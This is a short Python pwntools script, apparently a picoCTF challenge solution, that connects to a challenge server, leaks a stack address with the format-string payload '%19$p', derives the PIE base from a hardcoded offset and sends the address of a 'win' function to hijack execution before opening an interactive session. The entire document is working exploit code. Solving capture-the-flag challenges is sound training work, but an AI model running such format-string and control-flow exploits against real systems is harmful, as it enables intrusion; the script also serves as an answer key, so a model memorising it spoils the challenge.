#made by mel

from pwn import *

exe = ELF("./vuln")

with remote("rescued-float.picoctf.net", 62646) as p:
	p.sendlineafter(b"name:", b"%19$p")
	addr = int(p.recvline()[2:],16)

	#calculate the PIE base address using stuff from gdb testing
	#the number is the distance this address will be from the base address
	exe.address = addr-5185
	
	#jump to the win function
	p.sendlineafter(b"0x12345: ", hex(exe.sym["win"])[2:].encode("ascii"))
	p.interactive()